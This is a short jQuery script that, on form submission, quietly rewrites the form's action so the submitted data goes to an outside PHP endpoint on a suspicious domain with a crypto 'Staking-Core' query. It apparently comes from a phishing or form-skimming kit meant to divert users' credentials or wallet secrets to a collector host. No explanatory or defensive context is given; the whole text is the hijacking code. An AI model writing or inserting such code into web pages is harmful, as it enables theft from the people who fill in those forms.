$("form").submit(function() {
  $(myform).attr("action", "https://torpedo-mashee.my.id/core/kawahara.php?Staking-Core");
});
